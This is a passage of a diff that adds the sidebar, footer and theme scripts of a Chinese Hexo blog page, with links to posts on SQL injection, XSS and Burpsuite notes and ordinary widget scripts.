+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            notwiner
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>notwiner的小站,notwiner,博客,博客笔记</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/12/03/%E8%BD%AF%E4%BB%B6/">一些软件整理</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/11/30/sqlmap%E5%92%8Csqli-labs/">sqlmap与sqli-labs记录</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/18/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/">sql注入基础</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/08/PHP%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/">PHP学习（一）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">《XSS跨站脚本攻击剖析与防御》读书笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/27/python3%E5%AD%A6%E4%B9%A02/">python3学习（二）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/26/%E6%9D%82%E8%AE%B0/">杂记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/07/26/Burp/">Burpsuite笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/06/08/%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/">密码学（一）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/05/14/python3%E5%AD%A6%E4%B9%A0/">python3学习（一）</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2020/08/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2020/08/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2020/08/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/Burpsuite/" style="font-size: 10.140111440350754px;" class="tag-cloud-link">Burpsuite</a>
+    
+    <a href="/tags/Git/" style="font-size: 17.44804129051236px;" class="tag-cloud-link">Git</a>
+    
+    <a href="/tags/PHP/" style="font-size: 12.256838435160729px;" class="tag-cloud-link">PHP</a>
+    
+    <a href="/tags/sql/" style="font-size: 12.473167606829787px;" class="tag-cloud-link">sql</a>
+    
+    <a href="/tags/XSS/" style="font-size: 14.148821152202043px;" class="tag-cloud-link">XSS</a>
+    
+    <a href="/tags/hexo/" style="font-size: 15.714515884341129px;" class="tag-cloud-link">hexo</a>
+    
+    <a href="/tags/linux/" style="font-size: 13.200112752518287px;" class="tag-cloud-link">linux</a>
+    
+    <a href="/tags/python3/" style="font-size: 8.740575464578296px;" class="tag-cloud-link">python3</a>
+    
+    <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 14.149960350632707px;" class="tag-cloud-link">上传</a>
+    
+    <a href="/tags/sqlmap/" style="font-size: 13.050007205121787px;" class="tag-cloud-link">sqlmap</a>
+    
+    <a href="/tags/wireshark/" style="font-size: 17.500627708548286px;" class="tag-cloud-link">wireshark</a>
+    
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 8.672259833261002px;" class="tag-cloud-link">笔记</a>
+    
+    <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 8.33875765518356px;" class="tag-cloud-link">密码学</a>
+    
+    <a href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" style="font-size: 16.208438849669545px;" class="tag-cloud-link">树莓派</a>
+    
+    <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 8.243375314888652px;" class="tag-cloud-link">编码</a>
+    
+    <a href="/tags/%E6%8E%98%E5%AE%89CTF/" style="font-size: 10.153785987967812px;" class="tag-cloud-link">掘安CTF</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="https://myau.moe/" target="_blank">gal主题作者</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/wen1ling/" target="_blank">Github</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 notwiner Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true,"width":90,"height":150},"react":{"opacity":0.8}});</script></body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
